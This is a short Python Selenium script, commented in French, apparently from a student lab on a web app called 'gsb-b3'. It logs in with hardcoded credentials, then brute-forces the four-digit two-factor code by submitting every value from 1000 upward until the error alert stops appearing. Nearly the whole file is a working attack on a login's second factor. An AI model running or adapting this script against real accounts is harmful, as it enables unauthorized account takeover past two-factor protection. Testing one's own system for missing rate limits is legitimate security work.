from selenium import webdriver
from selenium.webdriver.common.by import By

# Identifiants connus
login = 'lvillachane'
mdp = 'jux7g'

driver = webdriver.Chrome()
driver.get("http://gsb-b3/index.php")#"?uc=connexion&action=valideConnexion")

try:
    driver.find_element(By.CSS_SELECTOR, 'input[name="login"]').clear()
    driver.find_element(By.CSS_SELECTOR, 'input[name="login"]').send_keys(login)
    driver.find_element(By.CSS_SELECTOR, 'input[name="mdp"]').clear()
    driver.find_element(By.CSS_SELECTOR, 'input[name="mdp"]').send_keys(mdp)
    driver.find_element(By.TAG_NAME, 'form').submit()
except:
    print("Erreur, la page de connexion est incorrecte...")

for code in range(1000, 9999):
    # On teste le code
    try:
        driver.find_element(By.CSS_SELECTOR, 'input[name="code"]').send_keys(code)
        driver.find_element(By.TAG_NAME, 'form').submit()
        try:
            driver.find_element(By.CLASS_NAME, 'alert-danger')
        except:
            print("Code A2F trouvé : ", code)
            break
    except:
        print("Erreur, la page de saisie du code A2F est incorrecte...")
        break;
